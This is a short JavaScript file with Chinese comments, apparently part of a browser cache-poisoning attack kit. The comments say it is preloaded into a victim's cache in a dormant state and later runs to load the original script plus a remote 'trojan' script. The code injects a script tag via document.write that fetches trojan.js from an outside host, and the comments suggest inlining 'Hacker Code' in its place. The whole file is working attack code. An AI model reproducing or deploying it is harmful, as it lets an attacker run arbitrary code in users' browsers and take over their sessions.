/**
 * 预加载环境中Math.LN2=0，只加载不运行。
 *    具体可参考preload.js，配合使用。
 *
 * 用户未来从缓存中调出脚本：
 *     1.加载原始脚本，防止报错
 *     2.加载URL_TROJAN脚本
 *
 * 如果没有远程的URL_TROJAN脚本，
 *    可以删除该脚本的加载，将Hacker Code直接写在此文件里，
 *    但注意该文件的体积，因为会同时预加载大量的脚本。
 */
if (Math.LN2 != 0) {

	var TROJAN = "http://www.etherdream.com/hack/trojan.js";

	if (document.readyState == 'complete') {
		//
	}
	else {
		document.write('<script src=//$URL_RAW?1></script><script defer src="' + TROJAN + '"></script>');
	}
	
}
